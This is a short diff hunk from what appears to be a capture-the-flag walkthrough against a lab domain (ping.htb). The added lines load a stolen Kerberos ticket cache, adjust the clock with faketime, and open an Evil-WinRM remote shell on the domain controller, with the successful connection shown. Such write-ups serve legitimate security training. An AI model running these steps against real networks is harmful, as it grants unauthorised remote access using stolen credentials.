@@ -340,5 +340,14 @@ File 'c.roberts.ccache' already exists. Overwrite? (y/n - saying no will save wi
 Then ill auth with it, i now have a TGT that contains the authentication info to connect over WINRM
 
 ```python
+❯❯❯ export KRB5CCNAME=c.roberts.ccache
 
+❯❯❯ faketime -f +8h evil-winrm -i dc1.ping.htb -r ping.htb
+                                        
+Evil-WinRM shell v4.1
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Info: Connection successful
+*Evil-WinRM* PS C:\Users\C.Roberts\Documents> 
 ```
